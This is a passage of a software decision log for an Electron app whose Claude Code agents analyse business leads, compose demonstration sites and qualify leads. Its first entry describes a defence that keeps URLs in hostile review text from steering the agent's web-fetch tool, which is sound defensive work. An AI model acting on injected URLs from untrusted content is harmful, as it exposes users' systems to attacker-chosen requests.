- Decision: new module `electron/agent/evidence-hostname-allowlist.ts` extracts hostnames only from values held under a small, explicit set of key names — `website`, `link`, `homepage`, `domain`, or any key ending in `url` (`targetUrl`, `requestUrl`, ...) — walking the full JSON payload structurally but never reading the *content* of a string under any other key, however URL-shaped it looks. This is the load-bearing property: a hostile review's text is never a source of trust regardless of what it contains, because its key (`text`, typically) was never on the trusted list. `registrableDomain` reduces a hostname to its last two labels (a literal heuristic, not a Public Suffix List — documented as a known limitation, same posture as F6's DNS-rebinding gap). `buildEvidenceHostnameAllowlist` unions the registrable domains found across exactly the snapshots one task was given; `createHostnameAllowlistChecker` turns that into a `(hostname) => boolean` that fails closed on an empty allowlist. `website-inspector.ts`'s `inspectPublicWebsiteReadOnly` gained an optional `isHostnameAllowed` parameter, checked in `assertPublicHttpsUrl` alongside the existing local/internal denylist, applied at the entry URL and at every redirect hop symmetrically with F1/DEC-088's per-hop re-validation — omitting the option leaves prior denylist-only behavior unchanged, so no existing caller or test needed to change. `runtime.ts`'s `buildMcpConfigArgs` now sets `HORUS_TASK_EVIDENCE_IDS` (the current task's own evidence snapshot ids, comma-separated) in the MCP server's env on every call — the wiring object itself (`createEvidenceToolWiring`'s return value) is still built once and reused across calls per `main.ts`, but this value is recomputed fresh per task, since a stale or shared allowlist across tasks would defeat the "this task's own evidence" scoping the fix depends on. `evidence-mcp-server.ts` reads that env var at startup, loads each named snapshot through the read-only store it already opens, builds the allowlist, and passes the checker into both the entry call and (transitively, via the option threading above) every redirect hop of `inspect_public_website_readonly`. A missing or unreadable snapshot id is skipped rather than treated as fatal — consistent with how `HORUS_EVIDENCE_BASE` already tolerates evidence retained outside this app's normal write path.
- Consequences: closes the one item DEC-099 named as blocking further agent wiring, without loosening any other boundary — the tool remains GET-only, https-only, size-capped, timeout-bounded, and denylist-checked exactly as before; this adds a fourth, independent check rather than replacing any of the first three. A business's site fetched through a hostname not named in any structured field of the evidence actually supplied to that task (an unusual shape — HORUS's own discovery/measurement code already writes the `website`/`targetUrl` fields this allowlist reads) will now be refused with a specific message rather than silently succeeding; this is the intended fail-closed behavior, not a defect, but it means a future evidence source that names a business's URL under an unrecognized field name would need that field name added to `URL_KEY_PATTERN`/the `endsWith('url')` check, or its links would be refused. New tests: `evidence-hostname-allowlist.test.ts` (extraction, registrable-domain matching, and — the property that actually matters — that a hostname appearing only in review/free-text content is never granted) and `website-inspector-allowlist.test.ts` (entry-URL and per-redirect-hop enforcement), plus two additions to `agent-boundary.test.ts` confirming `HORUS_TASK_EVIDENCE_IDS` reaches the MCP config env and differs correctly between two tasks sharing one reused wiring. **Not verified in this environment** — `npm run lint`, `npm test`, and `npm run build` still need to run on the operator's own macOS machine. This decision does not by itself reverse DEC-099's "off the critical path" placement or wire the analyst into candidate selection (DEC-110's deferral) — those remain separate operator decisions, now unblocked rather than made.
- Supersedes: not applicable — implements SECURITY_REVIEW.md F4's own recorded recommendation; DEC-088, DEC-099, DEC-100, and DEC-101 are otherwise unchanged.

### DEC-128 — "Analyze candidates": the opportunity analyst reconnected to the real Shortlist/Search workflow, one button, results on the candidate cards

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written at the operator's request, immediately after DEC-127 closed SECURITY_REVIEW.md F4: "no siento nada automatizado" — DEC-127 was pure backend security plumbing with no felt effect in the app, and `AGENTIC_ARCHITECTURE_AUDIT.md`'s plan K step 2 is exactly this: reconnect `opportunity_analyst` to real candidate review, now that F4 is closed and DEC-099's blocker is gone. Two scoping choices were asked directly (AskUserQuestion) and answered: a single manual "Analyze candidates" button rather than automatic-on-search-completion, and results integrated directly into the Shortlist/Search candidate cards rather than left in the separate, existing experimental "Agent analyst" panel (`AnalystPanel.tsx`, still present, unchanged).
- Context: `opportunity_analyst` (`AGENT_ARCHITECTURE.md` §5, `runtime.ts`, `evidence-mcp-server.ts`) has been a real, bounded, schema-validated Claude Code subprocess call since it was first built, but nothing in the operator-facing Search or Shortlist workflow ever called it — the only place it could be exercised was `AnalystPanel.tsx`'s standalone experimental panel, disconnected from any actual candidate. DEC-099 kept it there deliberately, citing F4. With F4 closed (DEC-127), the operator asked to make it reachable from the actual candidate-review flow, without changing what it is allowed to do: it still computes no score, proposes no contact, and cannot qualify, rank, publish, or approve anything (DEC-045) — G4–G6 and both DEC-004 gates are untouched by this decision.
- Options considered: (1) run the analyst automatically the moment a search completes, for every candidate — this was my recommendation, since it removes a manual step entirely; the operator explicitly chose otherwise, so every run of a local Claude Code task (spending the operator's own Claude subscription usage, not a SerpApi/PageSpeed credit) stays an explicit, informed choice; (2) a single manual "Analyze candidates" button that runs the analyst once per already-scored candidate currently visible — **chosen** for triggering; (3) leave results only in the existing `AnalystPanel.tsx` experimental panel — rejected, that is exactly the disconnection the operator is asking to fix; (4) render results in a new, separate view — rejected in favor of (5) render results directly on the existing Shortlist/Search candidate cards, next to (never merged into) the deterministic reputation/web-opportunity score — **chosen**, matching my recommendation, so the analyst's observations sit exactly where the operator already looks when deciding what to review next.
- Decision: `candidate-scoring.ts` gained `buildCandidateEvidenceReferences`, which assembles the evidence a single candidate's analyst run should receive — always the shared discovery snapshot first (`serpapi.google_maps`, where every candidate's own `website` field lives, the trusted key DEC-127's allowlist reads), plus that candidate's retained review pages (`serpapi.google_maps_reviews`) and web-opportunity measurement (`pagespeed.mobile`, `horus.website-analysis`) when present — reading the exact same retained data the deterministic score already reads (`scoreCandidateFromHistory`, `auditCandidateFromMeasurement`), so the analyst is never given evidence access the deterministic score itself lacks. `OperatorWorkspace.tsx` added a new "Analyze candidates (agent, experimental)" gate zone on the Search view, styled and worded like the existing "Auto-screen candidates" control: an explainer of exactly what it does and does not do, a required checkbox acknowledging the run spends the operator's own Claude usage (not a SerpApi/PageSpeed credit) — the button stays disabled until checked, same pattern as every other spend-confirming control in this app — and the button itself, which runs `window.horus.agent.runAnalyst` once per already-scored visible candidate, sequentially, tracking progress (`n/total`) and collecting per-candidate errors without one failure stopping the rest. Results land in new `analystResults` state, keyed the same way as `scores`/`audits`, and are passed to `ShortlistView`. `ShortlistView.tsx` renders a new `AnalystNotes` component on both the ranked-candidate cards and the "not yet rankable" cards whenever that candidate has a result: a visually distinct (dashed border) block labeled "Agent analyst — unverified, evidence-cited draft," listing `proposedForReview` rationale, `observations` (each tagged `observed` or `insufficient data`), and any `missingInformation`, or the failure reason/detail if the run failed. New CSS (`.shortlist-analyst-*`) added to `App.css`, reusing existing design tokens (`--radius`, `--surface-2`, `--accent-blocked` for the failure state) rather than introducing new ones.
- Consequences: this is the first time `opportunity_analyst` output reaches an actual candidate the operator is evaluating, rather than only the disconnected experimental panel — directly answering "no siento nada automatizado" without loosening DEC-045 (the analyst still owns no consequential action) or DEC-099's underlying caution (each run remains an explicit, confirmed, one-candidate-at-a-time local subprocess call, not a background or automatic process). `AnalystPanel.tsx` is unchanged and still usable on its own. A run that fails for one candidate (e.g. the local `claude` CLI unavailable, per `checkAvailability`) is reported in an error list without blocking the remaining candidates in the batch. **Not yet delivered as tests or verified in this environment** — no new automated test was written for `buildCandidateEvidenceReferences`, `runAnalystForCandidates`, or `AnalystNotes` in this pass; `npm run lint`, `npm test`, and `npm run build` still need to run on the operator's own macOS machine, and the button itself still needs a manual run in the live app to confirm the analyst actually receives and can act on the assembled evidence end to end.
- Supersedes: not applicable — reconnects `opportunity_analyst` per `AGENTIC_ARCHITECTURE_AUDIT.md` plan K step 2, now unblocked by DEC-127; DEC-065, DEC-067, DEC-099, and AGENT_ARCHITECTURE.md §5 are otherwise unchanged.

### DEC-129 — `concept_composer` made real: the demonstration's structure, tone, "about" text and review quotes are now an agent's own decisions, rendered only by deterministic code

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written after the operator saw a real generated demonstration (Chiwa Bistro) and said plainly it was still poor quality despite DEC-114/DEC-116/DEC-122/DEC-123's polish passes: "sigue siendo una porqueria." Asked which specifically, the operator named content ("aqui es donde quiero que el agente se haga cargo" — this is where I want the agent to take charge) and structure/visual hierarchy ("Jerarquía visual plana," "Se ve genérico/plantilla"). Asked how much control to hand the agent, the operator chose the largest of three offered options: "Todo el sitio, agente decide estructura y estilo." Asked to confirm the one way to grant that without risking DEC-005 (never invent a fact) or DEC-024/DEC-083 (the legal notice and style isolation cannot become agent-authored), the operator confirmed: the agent decides in a schema-validated JSON object, never in HTML or CSS directly.
- Context: `AgentRole` has declared `concept_composer` since DEC-049; nothing ever implemented it. `buildDemonstrationSite` has always been a pure, deterministic template function (DEC-079/DEC-106/DEC-114/DEC-122/DEC-123) — every business gets the same section set (services, hours) in one of a few hard-coded orders, with no "about" copy and no way to surface a real review's own words. That ceiling is what DEC-122/DEC-123 kept polishing around rather than removing.
- Options considered: (1) leave `buildDemonstrationSite` deterministic and keep polishing it by hand — rejected; this is the third such pass (DEC-122, DEC-123) and the operator's own verdict on the result after two of them was "sigue siendo una porqueria"; (2) let the composer write raw HTML/CSS directly — this was offered and the operator explicitly declined it once the risk was named (no automatic way to keep an LLM's markup from breaking the DEC-024 legal notice, DEC-083 rule 6's style isolation, or DEC-005's no-invented-facts rule); (3) the composer returns a small, schema-validated JSON object — which sections to show (from a fixed enum: about/reviews/services/hours) and in what order, a tone preset (warm/minimal/bold, three fixed presentational bundles), a short tagline, an "about" paragraph, and a set of review quotes each required to cite the evidence snapshot it came from — and `buildDemonstrationSite` remains the only code that ever emits HTML or CSS, rendering exactly what the schema allows — **chosen**, matching what the operator confirmed.
- Decision: new `electron/agent/concept-composer-task.ts` (`buildConceptComposerTask`, `parseComposerOutput`) follows `analyst-task.ts`'s exact pattern — a bounded, evidence-cited, schema-validated Claude Code task, read-only (`read_evidence_snapshot` only; no website inspection, no write access) — with rules enforced at parse time, not just described in the prompt: `sectionOrder` may only contain `about`/`reviews`/`services`/`hours`, each once; `aboutParagraph` must be non-null exactly when `about` is included, and `reviewHighlights` non-empty exactly when `reviews` is, with the mismatch rejected outright rather than silently corrected; every `reviewHighlights` entry's `evidenceSnapshotId` is checked against the evidence the task actually received (section 11's rule, identical to the analyst's `evidenceSnapshotIds` check) and rejected if it cites anything else; length ceilings on tagline/about/quote/rationale keep this from becoming an unbounded copywriting surface; the same `assertNoScoreClaims` guard the analyst uses blocks any score-shaped field. New `electron/agent/concept-composer-ipc.ts` (`runConceptComposer`) wires it to one function, mirroring `analyst-ipc.ts` exactly, with no draft persistence (a composition is used once, inline, never stored). `main.ts` exposes `agent:composer:run`, reusing the same `analystRuntime` instance the analyst already uses — the runtime itself is role-agnostic, so no second `LocalAgentRuntime` was built. `demonstration.ts` gained an optional `composition` input and `DemonstrationComposition` type; when supplied, its `sectionOrder` decides which sections render and in what order (still filtered to sections whose own backing data actually exists — a composer asking for "hours" cannot make an hours table appear where there is no retained hours data, the same omit-when-absent rule every other section already follows), its `aboutParagraph`/`reviewHighlights` render as new "About" and "What people are saying" sections (escaped exactly like every other field here, never raw), and its `tone` selects one of three fixed presentational presets (border radius, headline weight/letter-spacing, section hover, an accent-stripe option) — never a value the agent writes freely. Omitting `composition` (the default) reproduces DEC-123's exact prior behavior byte-for-byte. `ProspectRecord.tsx`'s "Demonstration preview" section gained a "Compose with agent (experimental)" control above "Generate demonstration preview" — same spend-acknowledgment-checkbox pattern as DEC-128's "Analyze candidates" — that runs the composer once over this prospect's own already-retained evidence (assembled with the same `buildCandidateEvidenceReferences` DEC-128 built, now passed down from `OperatorWorkspace.tsx` as a new `evidenceReferences` prop) and shows its chosen sections/tone/rationale for the operator to read; pressing "Generate demonstration preview" afterward is what actually renders it — composing does not, by itself, change what is on screen.
- Consequences: the demonstration generator can, for the first time, show something other than a services/hours contact card — a short "about" paragraph and real quoted reviews, when the operator explicitly asks the agent to compose them. Nothing about DEC-004's publish gate changed: the operator still reads the full rendered preview, in the iframe, before the separate "Publish now" approval is even enabled — composing does not shortcut or pre-approve anything. Stated, honest limitation, same posture as SECURITY_REVIEW.md F5: `aboutParagraph`'s prose is not independently fact-checked against the evidence the way `reviewHighlights` quotes are (their `evidenceSnapshotId` citation is checked, their exact text is not verified verbatim against a stored review string — that would require plumbing raw review text into this validation layer, out of scope here) — this is why composed output only ever reaches an operator-facing preview, never a shortcut around the operator's own read of the result. New tests: `tests/concept-composer-ipc.test.ts` (schema/consistency/evidence-citation validation, mirroring `analyst-ipc.test.ts`'s structure) and additions to `tests/demonstration.test.ts` (composition rendering, ordering, escaping, omit-when-absent, and that every tone preset still contains no CSS custom-property syntax, DEC-083 rule 6). No test was added for `ProspectRecord.tsx`'s new UI wiring itself, consistent with this codebase's existing pattern of testing domain/IPC logic rather than React views. **Not verified in this environment** — `npm run lint && npm test && npm run build` and a manual "Compose with agent" run in the live app still need to happen on the operator's own machine.
- Supersedes: not applicable — implements `AgentRole`'s `concept_composer` for the first time (declared but unbuilt since DEC-049); DEC-079, DEC-106, DEC-114, DEC-122, DEC-123's deterministic rendering rules are extended, not replaced — every one of their outputs is still reachable by omitting `composition`.

### DEC-130 — A Qualification Agent computes `opportunityScore` and decides `qualified`/`REJECTED` for a lead moving through the automated pipeline — a narrow, explicit DEC-045 reversal

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written after the operator uploaded `agentic_orchestration.md` — a target architecture where a Qualification Agent computes its own opportunity score and qualifies or rejects a lead outright — and asked what HORUS is missing to work that way. `docs/ORCHESTRATOR_GAP_ANALYSIS.md` flagged, before any code was written, that this conflicts with DEC-045's own rule ("agents never own consequential actions... never compute a score — HORUS computes those") and DEC-008's rule that operator judgments/flags never auto-reject or auto-qualify. Asked directly which way to resolve that conflict, the operator chose "Agente calcula el score y decide" over the more conservative option this document itself recommended.
- Context: every score in HORUS until now — `reputation-scoring-v1`, `web-opportunity-v2` — is computed by deterministic code from measured evidence, with the operator answering the parts a formula cannot (G4/G5/G6, charter 9.5). DEC-045 made that a hard rule, not a default: an agent may observe and cite evidence, never compute a number that stands in for a decision. `agentic_orchestration.md`'s design asks for exactly that, for the one purpose of letting an automated pipeline decide on its own whether a lead is worth generating a website for, without a human in that specific loop.
- Options considered: (1) keep qualification fully deterministic — a fixed formula over the same signals `reputation-scoring-v1`/`web-opportunity-v2` already measure — and never let an agent decide it, extending DEC-045 unchanged to this new role; this was the recommendation in `docs/ORCHESTRATOR_GAP_ANALYSIS.md` §6, and the operator declined it; (2) let the Qualification Agent compute the score and decide qualification, scoped narrowly to leads moving through this specific automated pipeline path only — **chosen** — leaving every existing manually-triggered scoring surface (`CandidateScoreAction`, `CandidateWebOpportunityAction`, the G4/G5/G6 judgment gates, the Shortlist's own reputation/web-opportunity display) completely untouched: a human working a lead by hand still sees and trusts only the deterministic score, never this one; (3) let the agent propose a score but require a human to confirm it before qualification takes effect — rejected, because the operator's own answer to the paired question about approval gates ("Un solo gate al final") made clear the automated segment of the pipeline (discovery through QA) is meant to run with no human step inside it; a confirm-the-agent's-score step would have reintroduced exactly the manual gate the operator asked to remove there.
- Decision: new `electron/agent/qualification-task.ts` (`buildQualificationTask`, `parseQualificationOutput`) follows `analyst-task.ts`/`concept-composer-task.ts`'s exact bounded-task pattern — read-only (`read_evidence_snapshot` only), evidence-cited, schema-validated: `opportunityScore` (0–100), `qualified` (boolean), and a non-empty `reasons` array, each reason citing at least one evidence snapshot id actually supplied to the task (rejected outright, same as the analyst's and composer's own citation checks, if it cites anything else) — an empty `reasons` array is rejected as "a decision with no stated reasoning is not accepted." New `electron/agent/qualification-ipc.ts` (`runQualificationAgent`) wires it to one function, mirroring `analyst-ipc.ts`, with no draft persistence — its real record is the lead's own event history (DEC-131), not a separate drafts table. `runtime.ts`'s `AgentRole` union gained `'qualification_agent'`. Crucially, this agent is never given any tool or capability that could write a lead's status itself: it returns a score and a decision, and DEC-131's Orchestrator — deterministic code, not the agent — is the only thing that ever calls `appendValidatedLeadStatus`. That split is what keeps this reversal narrow: DEC-045's larger rule ("agents never own consequential actions") stays true everywhere except this one specific number; the actual state transition, and every write to durable storage, remains HORUS's own code, exactly as DEC-045 requires.
- Consequences: for the first time, something in HORUS that resembles a real accept/reject decision is made by an agent rather than a human or a fixed formula — and by design, `QUALIFYING` → `REJECTED` can happen with no human ever seeing the lead (DEC-008's own rule, that operator flags never auto-reject, does not literally cover an agent decision, but the underlying concern — a lead disappearing from view without anyone choosing that — is the same one). `docs/ORCHESTRATOR_GAP_ANALYSIS.md` recommended, and this decision keeps, `REJECTED` as a normal, visible status in the lead's own event history (`lead:get-state`) rather than a deletion — a rejected lead is inspectable and its recorded `reasons` are exactly what the agent cited, not lost. This reversal is scoped to the qualification_agent role and the automated pipeline path (`electron/orchestrator/run-lead.ts`) only; every existing manual scoring surface is unaffected and untested by this decision because it is unchanged by it. **Not verified in this environment** — `npm run lint && npm test && npm run build`, and a live qualification run through the actual Claude Code CLI, still need to happen on the operator's own machine. The still-open "Compose with agent" timeout (concept_composer, reported earlier this session) shares this same runtime/MCP code path and has not been root-caused; a first live qualification run may surface it again.
- Supersedes: narrows DEC-045 for exactly this one role and this one pipeline path; DEC-045's rule stands unchanged for `opportunity_analyst`, `concept_composer`, and every manually-triggered scoring surface in this codebase.

### DEC-131 — The Lead state machine and the Orchestrator's first wired step (DISCOVERED → QUALIFYING → QUALIFIED/REJECTED/FAILED); website generation and QA remain unwired

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written implementing `docs/ORCHESTRATOR_GAP_ANALYSIS.md`'s recommended build order, after the operator's unqualified "implementalo" approved that plan and its order.
- Context: `agentic_orchestration.md`'s design needs somewhere to record which stage of an automated pipeline each lead is in, and something deterministic to move it between stages. Neither existed. The gap analysis's own recommended order was: (1) the Lead state machine, (2) the Qualification Agent (DEC-130) and its own decision record, (3) an Orchestrator skeleton covering discovery→qualification first, (4) a QA correction loop, (5) a retry/failure framework, deliberately smallest-safe-piece-first rather than the whole chain in one pass.
- Options considered: (1) build the entire automated chain — qualification, website generation, QA, and the correction loop — in one pass, matching `agentic_orchestration.md`'s full diagram; rejected for this pass specifically because website generation (`buildDemonstrationSite`) lives under `src/domain/` and runs today only in the renderer (`ProspectRecord.tsx`'s "Generate demonstration preview"), while the Orchestrator necessarily lives under `electron/` (it owns durable writes) — `tsconfig.electron.json` builds only `electron/`, `tsconfig.app.json` builds only `src/`, so chaining a headless website-generation step into the Orchestrator needs a real design decision (reimplement generation under `electron/`, or have the main process ask the running renderer to generate and report back over IPC) that has not been made; forcing it through without that decision risked either a broken build or a fragile, undocumented workaround. (2) the gap analysis's own incremental order, stopping this pass at qualification — **chosen**.
- Decision: new `electron/orchestrator/lead-state.ts` — a pure, deterministic module: given a lead's own event history, replay it into a current `LeadStatus` (the 13-state vocabulary `agentic_orchestration.md` itself defines, unchanged). `ALLOWED_TRANSITIONS` names every transition the Orchestrator may ever write, including a `QA_FAILED → WEBSITE_GENERATING` retry edge the document's prose describes but its diagram doesn't draw; anything not listed is refused. This lives under `electron/`, not `src/domain/`, despite having no Electron dependency — the same rootDir boundary named above, resolved the same way DEC-109's `MOBILE_AUDIT_IDS` already resolves it in this codebase (a value kept where its real consumer lives, documented rather than silently duplicated). New `electron/orchestrator/lead-store.ts` (`readLeadState`, `appendValidatedLeadStatus`) is the only code in this codebase permitted to write a `'lead'`-aggregate event — no schema change needed, `persistence.ts`'s event store was already generic — and it re-reads the lead's current state immediately before validating a write, rather than trusting a status passed in, so two calls in flight cannot both validate against a status that is about to be stale. New `electron/orchestrator/lead-evidence.ts` (`assembleLeadEvidence`) reimplements `buildCandidateEvidenceReferences`'s exact composition server-side (same boundary reason as `lead-state.ts`), plus a scan (`findDiscoverySnapshotForLead`) to locate which retained discovery snapshot a bare `dataId` came from — something the renderer's own version never needed, since it already holds that snapshot id in component state from the search that produced the candidate list. New `electron/orchestrator/run-lead.ts` (`advanceLeadQualification`) is the Orchestrator's first and only wired step this pass: for a `DISCOVERED` lead with retained evidence, it writes `QUALIFYING`, runs the Qualification Agent (DEC-130) over that evidence, and writes `QUALIFIED`/`REJECTED` (or `FAILED` on a runtime failure) with the agent's own score and reasons recorded as the transition's `detail`. Calling it on a lead not currently `DISCOVERED`, or with no retained discovery evidence, is a safe no-op (`status: 'skipped'`) rather than an error — deliberately, so a renderer trigger can call it without first checking state itself. `main.ts` exposes `orchestrator:advance-qualification` and a read-only `lead:get-state`, both reusing the existing `analystRuntime` (role-agnostic, same reason `agent:composer:run` reuses it). `ProspectRecord.tsx` gained a minimal "Pipeline status (experimental, DEC-131)" panel — "Check status" and "Run qualification" buttons and the lead's latest recorded transition — the smallest possible manual trigger, not yet the "no human step between them" automatic chaining `agentic_orchestration.md` and the operator's own answers call for; that requires website generation and QA to be wired in first (see Consequences).
- Consequences: a lead can now be qualified or rejected by the agent and have that recorded as real, durable, replayable history — a real piece of the target architecture, not a mock. It does **not** yet deliver "no human step between discovery, qualification, website generation and QA": today, after qualification, generating and publishing a demonstration still requires the operator to open the prospect and press the existing manual buttons, exactly as before this decision. Closing that gap is explicitly left as the next piece of this same plan (build order steps 3's remainder, 4, and 5): decide how website generation reaches the Orchestrator (reimplement under `electron/`, or an IPC round-trip to the renderer), wire the QA Agent (already built, `electron/agent/qa-task.ts`/`qa-ipc.ts`, but not yet called by anything) into a `QA_FAILED → WEBSITE_GENERATING` retry loop bounded by `MAX_QA_RETRIES`, and add the `MAX_AGENT_RETRIES`/`MAX_QA_RETRIES` bounded-retry framework the gap analysis's step 5 describes. New tests: `tests/lead-state.test.ts` (transition table, replay, terminal states), `tests/lead-store.test.ts` (validated writes, rejection of disallowed transitions, freshness of the pre-write read), `tests/run-lead.test.ts` (qualified/rejected/failed/skipped paths for `advanceLeadQualification`, using a fake `HorusStore` and a fake `LocalAgentRuntime`, the same fixture style `qualification-ipc.test.ts` already established), `tests/qa-ipc.test.ts` (the QA Agent's own boundary, built this same pass though not yet wired into the Orchestrator). **Not verified in this environment** — `npm run lint && npm test && npm run build`, and a live "Run qualification" press in the actual app, still need to happen on the operator's own machine.
- Supersedes: not applicable — implements the Lead state machine and qualification step of `docs/ORCHESTRATOR_GAP_ANALYSIS.md`'s plan for the first time; DEC-130 is a sibling decision this one depends on but does not supersede.

### DEC-132 — A failure's captured stdout/stderr now travels into its `detail`, instead of being discarded on timeout

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written after the operator reported "Compose failed: timeout" a second time, with nothing further to go on — the same report as the first time, days earlier, which was never root-caused because the one diagnostic that could have explained it (a manual `claude -p` run with no `--mcp-config`) succeeded in ~2 seconds, ruling out the most likely theory (a first-run trust-folder hang) without ruling in a real cause.
- Context: `classifyFailure` (`runtime.ts`) always had `result.stdout`/`result.stderr` — `nodeSpawn` captures both — but for a timeout it returned a bare `'The runtime exceeded its time limit.'`, discarding whatever the `claude` subprocess had already written before being killed. That is exactly where a real cause would show up: an MCP server (`evidence-mcp-server.js`) that failed to start, a permission prompt Claude Code was silently waiting on, a stack trace. The composer's task-building/parsing code was already reviewed and is not obviously the source, but confirming that needs the subprocess's own output, which the app was throwing away.
- Options considered: (1) leave it as-is and keep asking the operator to run manual terminal reproductions, one hypothesis at a time — rejected, this had already cost one full diagnostic round with no answer, and every further theory (MCP server startup failure, evidence assembly, `--system-prompt` length, `--json-schema` size) needs the same missing evidence to confirm or rule out; (2) log to a file only, for a developer to inspect later — rejected, the operator has to relay whatever HORUS reports back to me since I cannot run their machine, so the information needs to reach the same `Compose failed: <reason>` surface that already exists; (3) append the captured output to every failure branch's `detail`, not just timeout, trimmed to a readable length — **chosen**.
- Decision: `classifyFailure` gained a private `excerpt(result)` helper: joins non-empty `stderr`/`stdout`, trims to the last 800 characters if longer (prefixed with `…`), and appends it to `detail` as `" Last output:\n<tail>"`, or `" No output was captured before the runtime ended."` when both streams were empty. Applied to the `timeout`, `cancelled`, `runtime_not_installed`, and generic `invalid_output` (nonzero exit) branches — the branches whose `detail` was previously a fixed string regardless of what the subprocess actually said. The `authentication_required`/`usage_limit_reached` branches keep their existing short messages unchanged, since those are already confirmed by matching specific text in the captured output, not guessed at. No change to `reason` values or to which branch is chosen — only `detail`'s text grew, and only in the direction of carrying more of what genuinely happened.
- Consequences: the next "Compose failed: timeout" (or any other agent-run failure) the operator reports will carry the subprocess's own last output along with it, which should either name the real cause directly (an MCP server startup error, a Claude Code warning, a truncated stack trace) or, if truly empty, rule out an entire class of theories (nothing was ever written, meaning the hang is inside Claude Code's own startup before any tool or MCP server activity, not after). This is a diagnostic aid, not a fix — it does not resolve the underlying timeout, and the operator was asked again to also try the pre-existing "Analyze candidates" button (DEC-128, same runtime/MCP wiring) to help separate a composer-specific cause from a systemic one. New tests: two additions to `tests/agent-boundary.test.ts` (`classifyFailure` carries captured stderr into a timeout's `detail`; a timeout with no output says so plainly). **Not verified in this environment** — `npm run lint && npm test && npm run build` still need to run on the operator's own machine, though this change is narrow enough that the existing 533-test baseline is unlikely to be disturbed (no test elsewhere asserts an exact `detail` string for a failed branch, only `reason` and, in one case, a `toContain` substring check unaffected by this change).
- Supersedes: not applicable — `classifyFailure`'s branching logic (DEC-049/DEC-056/DEC-062) is unchanged; only what its `detail` string carries is extended.

### DEC-133 — Suspected root cause of "Compose failed: timeout": a nullable-type-array JSON Schema construct the composer alone used

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review; not yet confirmed live.** Written after the operator ran "Analyze candidates" (the opportunity analyst, DEC-128) and it completed successfully with a full, well-formed result — the diagnostic step asked for since the first "Compose failed: timeout" report, days earlier, and never confirmed until now.
- Context: a successful analyst run through the exact same `analystRuntime`, the exact same MCP evidence-tool wiring, and the exact same `claude` CLI invocation path rules out every systemic theory this session had entertained: the runtime is installed and authenticated, `evidence-mcp-server.js` starts and serves `read_evidence_snapshot` correctly, and the isolated working directory / `--system-prompt` / `--mcp-config` plumbing all work. The failure is specific to the `concept_composer` task. Comparing `concept-composer-task.ts`'s `COMPOSER_OUTPUT_SCHEMA` against the analyst's, qualification's, and QA's own schemas found exactly one structural difference: `tagline` and `aboutParagraph` were declared as `{ type: ['string', 'null'] }` — a JSON Schema type-array union — while every other schema in this codebase (including the analyst's, which just ran successfully) uses only plain `type` strings and `enum`s, never a type array.
